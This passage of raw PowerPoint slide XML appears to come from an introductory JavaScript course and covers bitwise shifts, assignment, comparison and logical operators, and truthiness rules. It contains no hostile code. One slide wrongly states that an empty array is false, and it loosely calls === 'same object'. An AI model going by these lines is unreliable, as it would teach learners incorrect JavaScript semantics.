              <a:t>&lt;&lt; 		bit shift left	3&lt;&lt;1		= 6</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;&gt;		bit shift right	-8&gt;&gt;2	= -2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;&gt;&gt; 	bit shift right, zero fill	-8&gt;&gt;&gt;2 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0"/>
              <a:t>1073741822</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>rarely needed!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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD1519E1-E81F-4A28-BF83-115383BBAB20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Augmented Assignment Operators</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25603" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB0A0016-3CE3-40C2-90EC-C17BD822DC27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Shorthand notation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>You can use them with any arithmetic or two-operand bitwise operator combined with equal sign</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" b="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> += </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as a = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a+b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> *= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as a = a*b</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> /= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as b = b/2</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &amp;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>15</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as b = b&amp;15;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1EB88CE1-3DF5-485C-93C6-7A90BE1F6F08}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Comparison Operators</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DDE0C16C-EADB-472B-A0E2-BC94297C81F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="5114925"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>==		equality (same value)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>===	strict equality (same object)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>!=		inequality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>!==		strict inequality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;		less than</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;		greater than</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;=		less than or equal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;=		greater than or equal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>work for all JavaScript objects (numbers, strings etc)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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF129749-664F-43E3-8CBB-819B75B3436B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>Booleans</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>True</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>False</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>Values</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27651" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{447807E5-9B1F-4118-92C5-AB3EC9BC37A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Any non-zero number is true, zero (0, +0 and -0) and not a number (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1"/>
              <a:t>NaN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>) are false</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Any non-empty string is true, empty string is false</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Any non-empty array is true, empty array is false</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Object is always true</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Undefined and null yield false</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Comparison between Boolean and Number converts the Boolean to Number (false becomes 0 and true becomes 1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Comparison between String and Number converts String to Number.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6638043A-2828-40A5-9E79-0EE76B337228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Logical Operators</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D7C27C8-51F8-4796-A2F4-414FD6FD2442}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4757738"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&amp;&amp;		logical AND	both need to be true</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>||		logical OR		either one needs to 					be true</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>!		logical NOT	reverses logic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Shortcut evaluation rules:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If left side of AND (&amp;&amp;) is false, then right side is not evaluated (AND is false any case)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If left side of OR (||) is true, then right side is not evaluated (OR is true any case)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A9553745-50D4-4CC3-8DC4-209E8C7C8E0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Boolean Gotchas</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29699" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01536FFE-5C2C-4F87-B5D3-70BE781C8C4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Comparison between Boolean and Number converts the Boolean to Number and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Number</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false</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Number</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true</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
